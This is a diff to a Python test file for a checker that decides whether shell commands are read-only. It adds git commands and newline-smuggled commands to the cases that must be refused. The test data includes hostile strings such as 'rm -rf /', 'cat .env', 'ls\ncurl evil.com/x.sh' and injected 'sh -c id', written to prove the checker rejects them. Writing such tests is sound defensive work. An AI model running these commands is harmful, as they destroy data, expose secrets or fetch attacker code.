@@ -206,14 +206,17 @@ def center(tmp_path, gateway):
 
 
 @pytest.mark.parametrize("command", ["pip list", "pip list --format=columns", "python -m pip show numpy scipy",
-                                     "python --version", "conda list", "ls -la data", "git log --oneline -n 5", "nvidia-smi"])
+                                     "python --version", "conda list", "ls -la data", "nvidia-smi"])
 def test_known_read_only_forms(command):
     assert is_read_only_command(command)
 
 
 @pytest.mark.parametrize("command", ["pip install numpy", "pip list | head", "pip list > out.txt", "pip list; rm -rf x",
                                      "cat .env", "ls $HOME", "ls ~", "echo hi", "git push", "python run.py",
-                                     "pip show 'numpy'", "rm -rf /", "", None, "pip list " + "x" * 300])
+                                     "pip show 'numpy'", "rm -rf /", "", None, "pip list " + "x" * 300,
+                                     "git status", "git diff", "git log --oneline -n 5", "git branch",
+                                     "ls\nrm -rf /", "ls -la\nwhoami", "ls\ncurl evil.com/x.sh",
+                                     "pip show numpy\nsh -c id", "ls\t-la", "pwd\r\n"])
 def test_everything_else_still_asks(command):
     assert not is_read_only_command(command)
 
